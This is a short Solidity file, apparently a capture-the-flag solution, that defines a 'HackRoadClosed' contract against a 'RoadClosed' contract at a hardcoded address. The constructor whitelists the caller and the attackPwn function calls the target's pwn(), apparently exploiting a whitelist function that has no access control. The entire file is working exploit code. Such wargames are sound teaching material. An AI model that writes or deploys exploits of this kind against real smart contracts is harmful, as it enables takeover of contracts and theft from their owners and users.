// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.7;


import "./RoadClosed.sol";

contract HackRoadClosed {
    RoadClosed target = RoadClosed(0xD2372EB76C559586bE0745914e9538C17878E812);

    constructor() {
        target.addToWhitelist(address(msg.sender));
    }

    function attackPwn() external {
        target.pwn();
    }
}
